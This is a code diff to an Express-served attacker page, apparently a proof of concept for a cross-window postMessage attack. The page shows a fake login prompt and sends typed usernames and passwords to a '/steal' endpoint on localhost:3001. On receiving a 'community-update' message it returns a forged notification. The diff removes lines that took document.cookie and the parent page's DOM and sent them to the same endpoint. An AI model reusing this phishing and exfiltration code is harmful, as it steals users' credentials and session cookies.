@@ -40,7 +40,7 @@ app.get('/', (req, res) => {
             var username = document.getElementById('username').value;
             var password = document.getElementById('password').value;
             if (username && password) {
-              fetch('http://localhost:3001/steal?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password) + '&origin=' + encodeURIComponent(window.location.origin), { mode: 'no-cors' });
+              fetch('http://localhost:3001/steal?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password), { mode: 'no-cors' });
               outputDiv.innerHTML += '<p>Credentials submitted: ' + username + '</p>';
               loginPrompt.style.display = 'none';
             }
@@ -51,19 +51,9 @@ app.get('/', (req, res) => {
             if (event.data === 'type=community-update') {
               outputDiv.innerHTML += '<p>Received community-update from ' + event.origin + ' at ' + new Date().toLocaleTimeString() + '</p>';
               loginPrompt.style.display = 'block';
-              var cookies = document.cookie;
-              console.log('Cookies:', cookies);
-              fetch('http://localhost:3001/steal?cookies=' + encodeURIComponent(cookies) + '&origin=' + event.origin, { mode: 'no-cors' });
               var fakeNotification = 'type=community-notification&unread=true';
               event.source.postMessage(fakeNotification, event.origin);
               console.log('Sent fake notification back');
-              try {
-                var parentContent = window.top.document.body.innerHTML;
-                console.log('Parent DOM:', parentContent);
-                fetch('http://localhost:3001/steal?dom=' + encodeURIComponent(parentContent.slice(0, 100)), { mode: 'no-cors' });
-              } catch (e) {
-                console.error('DOM access blocked:', e);
-              }
             } else {
               outputDiv.innerHTML += '<p>Received other message: ' + event.data + ' from ' + event.origin + '</p>';
             }
